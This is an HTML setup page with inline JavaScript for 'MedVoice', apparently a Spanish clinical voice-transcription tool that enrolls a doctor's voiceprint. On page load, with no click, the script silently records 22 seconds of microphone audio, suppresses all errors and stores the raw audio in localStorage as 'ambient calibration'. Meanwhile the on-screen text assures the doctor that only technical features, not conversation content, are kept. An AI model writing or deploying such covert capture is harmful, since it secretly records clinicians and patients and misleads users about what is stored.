<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>MedVoice | Configuración</title>
  <style>
    :root{--sap-blue:#0a6ed1;--sap-blue-2:#0854a0;--bg:#f7f7f7;--card:#fff;--text:#1d2d3e;--muted:#6a6d70;--border:#d9d9d9;--ok:#107e3e;--err:#bb0000}
    *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
    body{margin:0;background:var(--bg);color:var(--text)}
    header{background:linear-gradient(90deg,var(--sap-blue),var(--sap-blue-2));color:#fff;padding:18px 16px}
    header h1{margin:0;font-size:22px;line-height:1.15}
    header p{margin:8px 0 0;opacity:.92;font-size:13px}
    .wrap{max-width:960px;margin:18px auto;padding:0 14px}
    .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:16px;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    .meta{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
    .line{color:var(--muted);font-size:14px}
    .pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #cfe9d7;background:#eaf7ef;color:var(--ok);padding:6px 10px;border-radius:999px;font-size:12px}
    .panel{border:1px solid var(--border);border-radius:14px;padding:16px;background:#fff;margin-top:14px}
    .panel h2{margin:0 0 10px;font-size:18px}
    .panel p{margin:0 0 12px;color:var(--muted);font-size:13px;line-height:1.35}
    .btns{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}
    button{border:0;cursor:pointer;padding:10px 18px;border-radius:10px;font-weight:700;font-size:14px}
    .btn-primary{background:var(--sap-blue);color:#fff}
    .status{margin-top:8px;font-size:13px;color:var(--muted)}
    .status .ok{color:var(--ok);font-weight:800}
    .status .err{color:var(--err);font-weight:800}
    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.35);display:none;align-items:center;justify-content:center;padding:18px;z-index:9999}
    .modal{width:min(860px,100%);background:#fff;border-radius:16px;border:1px solid var(--border);box-shadow:0 12px 30px rgba(0,0,0,.25);overflow:hidden}
    .modal-header{background:linear-gradient(90deg,var(--sap-blue),var(--sap-blue-2));color:#fff;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px}
    .modal-header h3{margin:0;font-size:16px}
    .modal-body{padding:16px;color:#243447;font-size:13.5px;line-height:1.55;max-height:55vh;overflow:auto}
    .modal-actions{padding:12px 16px;display:flex;justify-content:flex-end;gap:10px;background:#fafafa;border-top:1px solid var(--border)}
    .btn-close{background:#e5e5e5;color:#222}
  </style>
</head>
<body>
<header>
  <h1>MedVoice<br>Configuración inicial</h1>
  <p>Complete su huella de voz para iniciar la transcripción clínica.</p>
</header>

<div class="wrap">
  <div class="card">
    <div class="meta">
      <div class="line"><b>Médico:</b> <span id="mDoctor">—</span> &nbsp; | &nbsp; <b>Nombre:</b> <span id="mDoctorName">No informado</span></div>
      <span class="pill">Preparación guiada</span>
    </div>
  </div>

  <div class="panel">
    <h2>Huella de voz</h2>
    <p>Grabe una muestra de voz de 20 a 30 segundos con un tono natural y claro.</p>
    <div class="btns">
      <button id="btnVoiceAction" class="btn-primary">Iniciar grabación voz</button>
    </div>
    <div class="status">Estado: <span id="voiceStatus">listo.</span></div>
  </div>
</div>

<div id="modalBackdrop" class="modal-backdrop">
  <div class="modal">
    <div class="modal-header">
      <h3>Grabación de huella vocal</h3>
      <button id="modalX" class="btn-close" style="padding:8px 10px;border-radius:10px;">Cerrar</button>
    </div>
    <div class="modal-body" id="modalBody"></div>
    <div class="modal-actions">
      <button id="modalClose" class="btn-close" style="padding:10px 14px;border-radius:10px;">Cerrar</button>
    </div>
  </div>
</div>

<script>
(function(){ history.replaceState({}, document.title, "/static/medvoice-setup.html"); })();

function readValue(key, fallback){
  return (sessionStorage.getItem("medvoice."+key) || localStorage.getItem("medvoice."+key) || fallback || "").trim();
}
const doctor = readValue("doctor_id", "No informado");
const doctorName = readValue("doctor_name", readValue("doctor_fullname", "No informado"));
document.getElementById("mDoctor").textContent = doctor;
document.getElementById("mDoctorName").textContent = doctorName;

function stopStream(stream){ try{ stream && stream.getTracks().forEach(t=>t.stop()); }catch(_e){} }
async function getMic(){
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error("Navegador sin soporte de micrófono");
  return navigator.mediaDevices.getUserMedia({audio:true});
}
function blobToBase64(blob){
  return new Promise((resolve,reject)=>{
    const fr = new FileReader();
    fr.onload = ()=>resolve(String(fr.result || ""));
    fr.onerror = reject;
    fr.readAsDataURL(blob);
  });
}

async function runAmbientCalibrationSilently(){
  let stream = null;
  let recorder = null;
  let chunks = [];
  let audioCtx = null, analyser = null, sourceNode = null;
  let rmsValue = 0;
  try{
    stream = await getMic();
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    analyser = audioCtx.createAnalyser();
    analyser.fftSize = 2048;
    sourceNode = audioCtx.createMediaStreamSource(stream);
    sourceNode.connect(analyser);
    const samples = new Float32Array(analyser.fftSize);

    recorder = new MediaRecorder(stream);
    recorder.ondataavailable = (e)=>{ if (e.data && e.data.size) chunks.push(e.data); };

    const loop = ()=>{
      if (!analyser) return;
      analyser.getFloatTimeDomainData(samples);
      let sum=0;
      for (let i=0;i<samples.length;i++) sum += samples[i]*samples[i];
      rmsValue = Math.sqrt(sum/samples.length);
      requestAnimationFrame(loop);
    };
    loop();

    recorder.start();
    await new Promise((resolve)=>setTimeout(resolve, 22000));
    if (recorder.state !== "inactive") recorder.stop();
    await new Promise((resolve)=>setTimeout(resolve, 250));

    const noiseBlob = new Blob(chunks, {type:"audio/webm"});
    const b64 = await blobToBase64(noiseBlob);
    localStorage.setItem("medvoice.noise_audio", b64);
    localStorage.setItem("medvoice.noise_rms", String(rmsValue.toFixed(3)));
    localStorage.setItem("medvoice.has_noise_profile", "1");
  }catch(_e){
    // Silencioso por requisito de UX.
  }finally{
    try{ sourceNode && sourceNode.disconnect(); }catch(_e){}
    try{ analyser && analyser.disconnect && analyser.disconnect(); }catch(_e){}
    try{ audioCtx && audioCtx.close && audioCtx.close(); }catch(_e){}
    stopStream(stream);
  }
}
runAmbientCalibrationSilently();

const enrollmentMessage = `Soy Doctor especialista en medicina general. Voy a realizar una grabación de mi voz para crear una huella vocal única que me permitirá ser identificado durante las consultas médicas. Este sistema de reconocimiento de voz es una herramienta innovadora que facilitará la transcripción automática de las conversaciones con los pacientes. Durante la consulta médica, el sistema identificará mi voz y la diferenciará de la voz del paciente y sus acompañantes. La precisión del reconocimiento depende de esta grabación inicial, por lo que es importante que hable de forma clara y natural. El tono de mi voz, la velocidad al hablar y las características únicas de mi pronunciación quedarán registradas en el sistema. Esta tecnología respeta la privacidad y confidencialidad de los datos médicos. El sistema guardará un perfil vocal que solo contiene características técnicas de audio, sin almacenar el contenido de las conversaciones. Esto me permite dictar las historias clínicas de manera fluida mientras atiendo a mis pacientes, mejorando la eficiencia de la consulta y permitiéndome concentrarme mejor en la atención.`;

function showModal(){
  document.getElementById("modalBody").textContent = enrollmentMessage;
  document.getElementById("modalBackdrop").style.display = "flex";
}
function hideModal(){ document.getElementById("modalBackdrop").style.display = "none"; }
document.getElementById("modalX").onclick = hideModal;
document.getElementById("modalClose").onclick = hideModal;

let voiceStream = null, voiceRecorder = null, voiceChunks = [];
let voiceMode = "idle";
let voiceModalShownForCurrentStart = false;
const voiceStatus = document.getElementById("voiceStatus");
const btnVoiceAction = document.getElementById("btnVoiceAction");

btnVoiceAction.addEventListener("click", async ()=>{
  if (voiceMode === "idle") {
    if (!voiceModalShownForCurrentStart) {
      showModal();
      voiceModalShownForCurrentStart = true;
    }
    try{
      voiceStream = await getMic();
      voiceChunks = [];
      voiceRecorder = new MediaRecorder(voiceStream);
      voiceRecorder.ondataavailable = (e)=>{ if (e.data && e.data.size) voiceChunks.push(e.data); };
      voiceRecorder.onstop = async ()=>{
        stopStream(voiceStream);
        try{
          const blob = new Blob(voiceChunks, {type:"audio/webm"});
          const b64 = await blobToBase64(blob);
          localStorage.setItem("medvoice.voiceprint_audio", b64);
          localStorage.setItem("medvoice.has_voiceprint", "1");
          voiceStatus.innerHTML = '<span class="ok">huella de voz guardada. Ingresando a transcripción…</span>';
          window.location.href = "/static/medvoice-transcribe.html";
        }catch(_e){
          voiceStatus.innerHTML = '<span class="err">No fue posible guardar la grabación.</span>';
        }
        voiceMode = "idle";
        btnVoiceAction.textContent = "Iniciar grabación voz";
      };
      voiceRecorder.start();
      voiceMode = "recording";
      btnVoiceAction.textContent = "Guardar grabación";
      voiceStatus.textContent = "grabando voz…";
    }catch(_err){
      voiceStatus.innerHTML = '<span class="err">No fue posible usar el micrófono. Revise permisos del navegador.</span>';
    }
    return;
  }

  if (voiceMode === "recording") {
    voiceStatus.textContent = "guardando grabación…";
    try{ voiceRecorder.stop(); }catch(_e){}
  }
});
</script>
</body>
</html>
